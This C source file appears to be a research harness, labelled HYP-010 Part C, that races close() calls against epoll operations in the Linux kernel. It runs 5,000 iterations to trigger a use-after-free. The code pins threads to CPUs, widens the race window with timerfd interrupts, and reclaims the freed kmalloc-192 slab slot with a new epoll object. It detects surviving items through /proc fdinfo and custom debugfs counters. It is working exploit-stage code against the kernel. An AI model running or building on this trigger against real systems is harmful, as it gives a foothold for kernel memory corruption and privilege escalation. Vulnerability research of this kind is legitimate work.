// test_hyp010_natural.c — HYP-010 Part C: First Honest Natural Stage-1 Race (5,000 Iterations)
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/eventfd.h>
#include <sys/timerfd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/sysmacros.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <sys/mount.h>
#include <sys/reboot.h>
#include <pthread.h>
#include <sched.h>
#include <time.h>
#include <errno.h>

#define TOTAL_TRIALS 5000
#define RACE_DUP_CLOSE_ITERS 15
#define RACE_ENQUEUE_FORKS 2
#define RACE_WAITER_EPFDS 20
#define RACE_WAITER_DUPS 10

static inline uint64_t mono_ns(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
}

static inline void pin_to_cpu(int cpu) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpu, &cpuset);
    sched_setaffinity(0, sizeof(cpu_set_t), &cpuset);
}

static void print_str(const char *s) {
    write(STDOUT_FILENO, s, strlen(s));
}

// Shared synchronization between Racer (CPU 0) and Main (CPU 1)
static volatile int g_race_ready_main = 0;
static volatile int g_race_ready_racer = 0;
static volatile int g_race_done = 0;
static volatile int g_ep_race_waiter = -1;
static volatile uint64_t g_time_false_sharing = 10000;
static volatile int g_stop_racer = 0;

static int g_timerfd_wakeup = -1;
static struct epoll_event g_ev = { .events = EPOLLIN | EPOLLOUT };

static void setup_timerfd_waiters(int tfd) {
    for (int i = 0; i < RACE_ENQUEUE_FORKS; i++) {
        if (fork() == 0) {
            pin_to_cpu(0);
            int epfds[RACE_WAITER_EPFDS];
            for (int j = 0; j < RACE_WAITER_EPFDS; j++) {
                epfds[j] = epoll_create1(0);
                for (int k = 0; k < RACE_WAITER_DUPS; k++) {
                    int dupfd = dup(tfd);
                    struct epoll_event ev = { .events = EPOLLIN, .data.fd = dupfd };
                    epoll_ctl(epfds[j], EPOLL_CTL_ADD, dupfd, &ev);
                }
            }
            // Pause child indefinitely holding waiters
            while (1) sleep(1000);
            exit(0);
        }
    }
}

static void *racer_thread_func(void *arg) {
    pin_to_cpu(0);
    uint64_t launch_ahead_ns = 2500; // 2.5us

    while (!g_stop_racer) {
        while (!g_race_ready_main && !g_stop_racer) {
            sched_yield();
        }
        if (g_stop_racer) break;

        g_race_ready_main = 0;
        g_race_ready_racer = 1;

        uint64_t t_now = mono_ns();
        uint64_t t_fire = t_now + g_time_false_sharing / 2;
        struct itimerspec its;
        memset(&its, 0, sizeof(its));
        its.it_value.tv_sec = t_fire / 1000000000ULL;
        its.it_value.tv_nsec = t_fire % 1000000000ULL;
        timerfd_settime(g_timerfd_wakeup, TFD_TIMER_ABSTIME, &its, NULL);

        uint64_t t_close = t_fire > launch_ahead_ns ? (t_fire - launch_ahead_ns) : t_fire;
        while (mono_ns() < t_close) {
            // busy wait
        }

        close(g_ep_race_waiter);
        g_race_done = 1;
    }
    return NULL;
}

static int check_survivor_fdinfo(int epfd) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/self/fdinfo/%d", epfd);
    int fd = open(path, O_RDONLY);
    if (fd < 0) return 0;
    char buf[512] = {0};
    int n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return 0;
    buf[n] = '\0';

    // If "tfd:" is present, the epitem survived in epfd's rbtree
    if (strstr(buf, "tfd:") != NULL) {
        return 1;
    }
    return 0;
}

static long read_debugfs_counter(const char *name) {
    char path[128];
    snprintf(path, sizeof(path), "/sys/kernel/debug/epoll_uaf/%s", name);
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    char buf[64] = {0};
    int n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return -1;
    buf[n] = '\0';
    return strtol(buf, NULL, 10);
}

int main(int argc, char **argv) {
    print_str("=========================================================\n");
    print_str("=== HYP-010 Part C: First Honest Natural Stage-1 Race ===\n");
    print_str("=========================================================\n");

    struct rlimit rlim = { .rlim_cur = 65536, .rlim_max = 65536 };
    setrlimit(RLIMIT_NOFILE, &rlim);

    mkdir("/proc", 0755);
    mount("proc", "/proc", "proc", 0, NULL);
    mkdir("/sys", 0755);
    mount("sysfs", "/sys", "sysfs", 0, NULL);
    mkdir("/sys/kernel/debug", 0755);
    mount("debugfs", "/sys/kernel/debug", "debugfs", 0, NULL);
    mkdir("/dev", 0755);
    mount("devtmpfs", "/dev", "devtmpfs", 0, NULL);

    pin_to_cpu(1);

    g_timerfd_wakeup = timerfd_create(CLOCK_MONOTONIC, 0);
    if (g_timerfd_wakeup >= 0) {
        setup_timerfd_waiters(g_timerfd_wakeup);
        print_str("[+] Timerfd interrupt widening queue configured.\n");
    }

    pthread_t racer_th;
    pthread_create(&racer_th, NULL, racer_thread_func, NULL);

    char logbuf[256];
    snprintf(logbuf, sizeof(logbuf), "[*] Starting N=%d natural two-stage race iterations...\n", TOTAL_TRIALS);
    print_str(logbuf);

    int survivor_hits = 0;
    int setup_failures = 0;
    uint64_t t_start = mono_ns();

    for (int iter = 1; iter <= TOTAL_TRIALS; iter++) {
        int ep_race_waiter = epoll_create1(0);
        int ep_race_target = epoll_create1(0);
        int ep_uaf_waiter = epoll_create1(0);

        if (ep_race_waiter < 0 || ep_race_target < 0 || ep_uaf_waiter < 0) {
            setup_failures++;
            if (ep_race_waiter >= 0) close(ep_race_waiter);
            if (ep_race_target >= 0) close(ep_race_target);
            if (ep_uaf_waiter >= 0) close(ep_uaf_waiter);
            continue;
        }

        // Link race pair
        epoll_ctl(ep_race_waiter, EPOLL_CTL_ADD, ep_race_target, &g_ev);

        g_ep_race_waiter = ep_race_waiter;
        g_race_ready_main = 1;

        while (!g_race_ready_racer) {
            sched_yield();
        }
        g_race_ready_racer = 0;

        // Main thread (CPU 1) false sharing burst
        uint64_t t0 = mono_ns();
        for (int j = 0; j < RACE_DUP_CLOSE_ITERS; j++) {
            close(dup(ep_race_target));
        }
        g_time_false_sharing = mono_ns() - t0;

        // Close race target (initiates Stage 1 free)
        close(ep_race_target);

        // Immediate same-cache reclaim in kmalloc-192
        int ep_uaf_target = epoll_create1(0);
        if (ep_uaf_target >= 0) {
            // Attach uaf waiter
            epoll_ctl(ep_uaf_waiter, EPOLL_CTL_ADD, ep_uaf_target, &g_ev);
        }

        while (!g_race_done) {
            sched_yield();
        }
        g_race_done = 0;

        // Stage 2: Close ep_uaf_target
        if (ep_uaf_target >= 0) {
            close(ep_uaf_target);
        }

        // Oracle Evaluation WITHOUT instrumentation: Check if epitem survived in ep_uaf_waiter
        if (check_survivor_fdinfo(ep_uaf_waiter)) {
            survivor_hits++;
            snprintf(logbuf, sizeof(logbuf), "[+] NATURAL RACE HIT! Iteration %d: Survivor detected in ep_uaf_waiter (fd=%d)\n",
                     iter, ep_uaf_waiter);
            print_str(logbuf);
        }

        close(ep_uaf_waiter);

        if (iter % 1000 == 0) {
            uint64_t elapsed_ms = (mono_ns() - t_start) / 1000000ULL;
            snprintf(logbuf, sizeof(logbuf), "[*] Completed %d / %d iterations (%ld ms, hits=%d)...\n",
                     iter, TOTAL_TRIALS, (long)elapsed_ms, survivor_hits);
            print_str(logbuf);
        }
    }

    g_stop_racer = 1;
    pthread_join(racer_th, NULL);

    uint64_t total_time_ms = (mono_ns() - t_start) / 1000000ULL;

    print_str("\n=========================================================\n");
    print_str("=== HYP-010 Part C: Natural Race Results Summary ===\n");
    print_str("=========================================================\n");
    snprintf(logbuf, sizeof(logbuf), "[*] Total Iterations: %d\n", TOTAL_TRIALS);
    print_str(logbuf);
    snprintf(logbuf, sizeof(logbuf), "[*] Total Execution Time: %ld ms (avg %.2f us/iter)\n",
             (long)total_time_ms, (double)total_time_ms * 1000.0 / TOTAL_TRIALS);
    print_str(logbuf);
    snprintf(logbuf, sizeof(logbuf), "[*] Setup Failures: %d\n", setup_failures);
    print_str(logbuf);
    snprintf(logbuf, sizeof(logbuf), "[*] Natural Survivor Wins (Stage 1+2 Hit Count): %d / %d (%.4f%%)\n",
             survivor_hits, TOTAL_TRIALS, (double)survivor_hits * 100.0 / TOTAL_TRIALS);
    print_str(logbuf);

    // Read kernel-side debugfs telemetry if available
    long fep_cleared = read_debugfs_counter("fep_cleared");
    long uaf_detected = read_debugfs_counter("uaf_detected");
    long file_fcount_zero = read_debugfs_counter("file_fcount_zero");
    long uaf_file_detected = read_debugfs_counter("uaf_file_detected");

    print_str("\n--- Kernel-Side Custom Telemetry ---\n");
    snprintf(logbuf, sizeof(logbuf), "[*] fep_cleared (Stage 1 window entered): %ld\n", fep_cleared);
    print_str(logbuf);
    snprintf(logbuf, sizeof(logbuf), "[*] uaf_detected (hlist_del into freed epoll): %ld\n", uaf_detected);
    print_str(logbuf);
    snprintf(logbuf, sizeof(logbuf), "[*] file_fcount_zero (unpinned struct file access): %ld\n", file_fcount_zero);
    print_str(logbuf);
    snprintf(logbuf, sizeof(logbuf), "[*] uaf_file_detected (struct file UAF): %ld\n", uaf_file_detected);
    print_str(logbuf);

    print_str("\n[*] Natural race experiment completed. Powering off safely.\n");
    reboot(RB_POWER_OFF);
    return 0;
}
